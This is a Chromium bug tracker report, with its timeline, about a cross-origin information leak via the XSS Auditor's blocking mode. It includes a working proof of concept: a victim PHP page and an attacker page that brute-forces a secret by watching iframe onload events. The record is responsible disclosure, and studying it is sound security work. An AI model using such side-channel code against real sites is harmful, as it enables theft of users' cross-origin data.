# Security: Information Leak through XSS Auditor

| Field | Value |
|-------|-------|
| **Issue ID** | [40086022](https://issues.chromium.org/issues/40086022) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature |
| **Reporter** | dh...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2016-11-19 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**

Attackers can exploit the XSS Auditor's blocking mode in leaking information of any webpage from a different origin. Consider the following script in a webpage with origin different from that of the attacker:

<script>var key=719</script>

If this webpage sets the X-XSS-Protection header to '1; mode=block', an attacker can find this key for any user. All he/she has to do is make a webpage that loads different URLS such as the one mentioned below in an iframe:

<http://victim/#><script>var%20key=XXX

Where 'XXX' can be brute forced by providing all possible numbers. When 'XXX' equals to '719', the XSS Auditor gets triggered and blocks the page. This prevents the iframe's onload event handler to be called. By checking whether this event handler is called or not, the attacker can retrieve the 'key' of the user.

A possible fix to this issue can be that even when the page is blocked by the Auditor, the 'onload' event be called.

**VERSION**  

Chrome Version: [54.0.2840.71] + [stable]  

Operating System: [Ubuntu 14.04]

**REPRODUCTION CASE**

// victim.php  

----- POC ---------------------------------------------------

<?php
header('X-XSS-Protection: 1; mode=block');
?>
<html>
<head>
<script>var key=719</script>
</head>
<body>
</body>
</html>
-------------------------------------------------------------
## // attacker.html

<html>
<head>
<script>
```
  var urlPrefix = "http://localhost/victim.php#<script>var%20key=";  
  var start = 700;  
  var end = 800;  
  var flag = {};  
  var ctr = 0;  

  function crack()  
  {  
    var iframeDiv = document.getElementById("iframeDiv");  
    for(var i = start;i<=end;i++)  
    {  
      flag[i] = false;  
      // Creating iframe  
      var iframe = document.createElement("iframe");  
      iframe.src = urlPrefix + i;  
      iframe.id = i;  
      iframe.style.width = "1px";  
      iframe.style.height = "1px";  
      iframe.onload = iframeOnloadHandler;  
      iframeDiv.appendChild(iframe);  
    }  
  }  

  function iframeOnloadHandler()  
  {  
    var iframe = this;  
    var i = iframe.id;  
    iframe.parentNode.removeChild(iframe);  
    flag[i] = true;  
    ctr += 1;  
    if(ctr==(end-start))  
      outputKey();  
  }  

  function outputKey()  
  {  
    var contentDiv = document.getElementById("content");  
    for(var i = start;i<=end;i++)  
    {  
      if(flag[i]!=true)  
        contentDiv.innerText = "Key found: " + i;  
    }  
  }  

</script>  

```
 </head>
<body>
<button onclick="crack()"/>Crack Key</button> <br />
<div id="iframeDiv"></div> <br />
<div id="content"></div> <br />
</body>
</html>
-------------------------------------------------------------

## Timeline

### me...@chromium.org (2016-11-21)

Thanks for the report, I believe this is a duplicate of https://crbug.com/chromium/396544.

### me...@chromium.org (2016-11-21)

[Empty comment from Monorail migration]

[Monorail components: Blink>SecurityFeature]

### dh...@gmail.com (2016-11-21)

Hi, the vulnerability is different in both of these. However, the effect are same. The vulnerability mentioned in 396544 has already been patched. This is a new one.

### ts...@chromium.org (2016-11-28)

[Empty comment from Monorail migration]

### ts...@chromium.org (2016-11-28)

This still requires brute force, as far as I can tell.  In other words, the entire key must be guessed, not just a leading prefix.  Still, we'd like to fix this.

### ts...@chromium.org (2016-11-28)

[Empty comment from Monorail migration]

### dh...@gmail.com (2016-11-28)

[Comment Deleted]

### ts...@chromium.org (2016-11-28)

[Empty comment from Monorail migration]

### do...@chromium.org (2016-11-29)

[Empty comment from Monorail migration]

### mk...@chromium.org (2016-11-29)

Have you tried this against Canary? We changed the blocking behavior in https://codereview.chromium.org/2425663002, and based on some quick experimentation, it appears that a `load` event is indeed fired. Perhaps I'm misunderstanding your PoC, however.

### sh...@chromium.org (2016-11-29)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-29)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-29)

[Empty comment from Monorail migration]

### dh...@gmail.com (2016-11-30)

Unfortunately, I only have access to a Linux machine for now and Canary is not supported in linux. What I understand from the patch is that an error page is loaded instead of showing a blank page.

If a `load` event is indeed fired, it should probably fix the bug. Someone will have to test that thoroughly.

### sh...@chromium.org (2016-12-13)

tsepez: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-12-28)

tsepez: Uh oh! This issue still open and hasn't been updated in the last 29 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dh...@gmail.com (2016-12-28)

[Comment Deleted]

### ke...@chromium.org (2016-12-28)

The rewards program panel reviews bugs for eligibility as part of preparing to roll out the fix. Unfortunately this one isn't there yet.

### ts...@chromium.org (2017-01-03)

Can we confirm that https://codereview.chromium.org/2425663002 fixed the issue?

### dh...@gmail.com (2017-01-05)

Hi, I installed Windows 10 and Google Chrome Version 57.0.2972.0 canary (64-bit)

My POC didn't work and an 'onload' event was indeed fired. So I guess that that this does fix the issue in Canary but not in the stable version.


### ts...@chromium.org (2017-01-05)

Thanks.

### sh...@chromium.org (2017-01-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-09)

Your change meets the bar and is auto-approved for M56. Please go ahead and merge the CL manually. Please contact milestone owner if you have questions.
Owners: amineer@(clank), cmasso@(bling), gkihumba@(cros), bustamante@(desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2017-01-12)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-12)

Hi dhavalkapil@!  Thanks very much indeed for the report.  Our panel took a look at this and determined that we would have fixed this as part of https://crbug.com/chromium/654794 even without this report.  As such this falls outside the VRP, I'm sorry to say.  However the panel used their discretion to reward $500.  A member of our finance team will be in touch with the details of getting the payment to you, which will get you in the system and make it quicker to pay you if you're rewarded for more bugs in the future :-)

### dh...@gmail.com (2017-01-12)

Thank you team :) Let me know when I can make this exploit public.

### aw...@chromium.org (2017-01-13)

dhavalkapil@ - do you have a time/forum in mind where you'd like to talk about the exploit? It's a little more tricky than normal as it doesn't look like our mitigation is due to ship until M57 which would be mid March.

### dh...@gmail.com (2017-01-13)

I was planning to post about it on my blog. Never mind, I'll wait till it ships.

### aw...@chromium.org (2017-01-17)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-03-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-03-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-04-14)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/667079?no_tracker_redirect=1

[Monorail mergedinto: crbug.com/chromium/396544]
[Monorail components added to Component Tags custom field.]

### dt...@google.com (2025-02-13)

Bulk update of issues accidentally marked as duplicate in issue tracker migration (b/325072672)

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086022)*
